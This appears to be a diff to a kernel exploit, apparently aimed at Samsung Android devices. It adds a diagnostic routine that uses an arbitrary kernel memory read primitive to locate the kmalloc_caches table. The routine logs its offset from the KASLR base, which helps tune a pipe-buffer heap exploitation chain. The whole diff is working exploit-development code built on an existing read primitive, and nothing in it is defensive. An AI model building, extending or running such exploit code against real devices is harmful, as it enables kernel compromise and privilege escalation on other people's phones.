@@ -393,6 +393,66 @@ int pipe_cache_matches(uint64_t slab_cache) {
   return slab_cache == kmalloc_pipe_cache;
 }
 
+#if defined(APP_KMALLOC_CACHES_RUNTIME_DIAG) && \
+    APP_KMALLOC_CACHES_RUNTIME_DIAG
+static void diagnose_kmalloc_caches_offset(int fd, uint64_t slab_cache) {
+  enum {
+    DIAG_RADIUS = 0x800,
+    DIAG_BYTES = DIAG_RADIUS * 2,
+  };
+  unsigned char window[DIAG_BYTES];
+  uintptr_t compiled = data_addr(KMALLOC_CACHES);
+  uintptr_t start = compiled - DIAG_RADIUS;
+  ssize_t n = kernel_read_data(fd, start, window, sizeof(window));
+  if (n != (ssize_t)sizeof(window)) {
+    pr_info("kmalloc cache diag read failed addr=%016zx len=%zu ret=%zd "
+            "errno=%d\n",
+            start, sizeof(window), n, errno);
+    return;
+  }
+
+  const uint64_t *slots = (const uint64_t *)window;
+  const size_t slot_count = sizeof(window) / sizeof(slots[0]);
+  int hits = 0;
+  int pairs = 0;
+  for (size_t i = 0; i < slot_count; i++) {
+    if (slots[i] != slab_cache) {
+      continue;
+    }
+    uintptr_t hit = start + i * sizeof(slots[0]);
+    pr_info("kmalloc cache diag hit addr=%016zx compiled_delta=%zd "
+            "slot_value=%016zx\n",
+            hit, (ssize_t)(hit - compiled), slab_cache);
+    hits++;
+  }
+
+  /* kmalloc_caches is [type][KMALLOC_BUCKETS].  A 2 KiB cache is slot 11;
+     Samsung's accounted type is one row later, so the same cache pointer at
+     slots 11 and 25 identifies the table base without accepting a lone hit. */
+  for (size_t i = KMALLOC_PIPE_INDEX;
+       i + KMALLOC_BUCKETS < slot_count; i++) {
+    if (slots[i] != slab_cache ||
+        slots[i + KMALLOC_BUCKETS] != slab_cache ||
+        !is_direct_ptr(slots[i - 1]) ||
+        !is_direct_ptr(slots[i + KMALLOC_BUCKETS - 1])) {
+      continue;
+    }
+    uintptr_t base = start + (i - KMALLOC_PIPE_INDEX) * sizeof(slots[0]);
+    pr_info("kmalloc cache diag table base=%016zx image_off=%08zx "
+            "compiled_delta=%zd normal1k=%016zx normal2k=%016zx "
+            "cgroup1k=%016zx cgroup2k=%016zx\n",
+            base, base - kaslr_base, (ssize_t)(base - compiled),
+            slots[i - 1], slots[i],
+            slots[i + KMALLOC_BUCKETS - 1],
+            slots[i + KMALLOC_BUCKETS]);
+    pairs++;
+  }
+  pr_info("kmalloc cache diag summary compiled=%016zx slab=%016zx "
+          "hits=%d table_pairs=%d\n",
+          compiled, slab_cache, hits, pairs);
+}
+#endif
+
 int pipe_reclaim_cache_gate(int fd) {
   if (!is_direct_ptr(pipebuf_page_base)) {
     return 0;
@@ -461,6 +521,12 @@ int pipe_reclaim_cache_gate(int fd) {
   }
 
   pipe_cache_gate_ok = 0;
+#if defined(APP_KMALLOC_CACHES_RUNTIME_DIAG) && \
+    APP_KMALLOC_CACHES_RUNTIME_DIAG
+  if (is_direct_ptr(candidate_slab_cache)) {
+    diagnose_kmalloc_caches_offset(fd, candidate_slab_cache);
+  }
+#endif
   return 0;
 }
 
